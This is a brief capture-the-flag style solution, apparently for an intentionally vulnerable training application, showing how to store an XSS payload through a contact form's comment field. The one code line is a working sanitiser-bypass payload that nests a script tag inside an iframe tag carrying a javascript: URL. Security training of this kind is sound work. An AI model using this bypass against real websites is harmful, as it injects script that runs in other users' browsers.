# Server-side XSS Protection 
## Challenge: Perform a persisted XSS attack bypassing a server-side security mechanism. 
## Category: XSS

Contact form > comments

```
<<script>Foo</script>iframe src="javascript:alert(`xss`)">
```